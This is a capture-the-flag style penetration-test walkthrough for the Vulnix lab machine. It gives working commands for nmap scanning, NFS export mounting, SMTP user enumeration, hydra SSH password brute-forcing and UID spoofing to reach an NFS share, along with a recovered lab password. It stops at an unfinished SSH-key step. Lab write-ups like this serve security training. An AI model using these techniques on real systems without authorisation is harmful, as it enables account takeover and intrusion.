# Vulnix (Creatigon Basic Pentest)

---

## Nmap Enum

```sh
nmap -sV $IP
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
79/tcp   open  finger     Linux fingerd
110/tcp  open  pop3       Dovecot pop3d
111/tcp  open  rpcbind    2-4 (RPC #100000)
143/tcp  open  imap       Dovecot imapd
512/tcp  open  exec       netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
993/tcp  open  ssl/imaps?
995/tcp  open  ssl/pop3s?
2049/tcp open  nfs_acl    2-3 (RPC #100227)
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## NFS

- check the nfs

```sh
$ showmount -e $IP
Export list for 192.168.100.18:
/home/vulnix *

$ mkdir /tmp/vuln
$ mount $IP:/home/vulnix /tmp/vuln # mount into /tmp/vuln folder
# cannot enter even with root access
$ ls -la | grep vuln
drwxr-x---  2 nobody nogroup  4096 Sep  3  2012 vuln
```

## SMTP

- smtp user enum
- wordlist from MSF data

```sh
./smtp-user-enum.pl -M VRFY -U /usr/share/wordlists/unix_users.txt -t $IP
```

- username -> `user` exists

## SSH

- burte force username user

```sh
hydra -l user -P /usr/share/wordlists/rockyou.txt $IP ssh -t 4
```

- password -> `letmein`

- enter ssh with user:letmein
- no sudo access
- etc/passwd

```
user:x:1000:1000:user,,,:/home/user:/bin/bash
vulnix:x:2008:2008::/home/vulnix:/bin/bash
```

- create vulnix user with id 2008

```sh
sudo useradd -M -u 2008 vulnix
sudo passwd vulnix
su vulnix
```

- then can access nfs sharing folder
- try to create ssh authorized key and enter with id_rsa, but not working, now
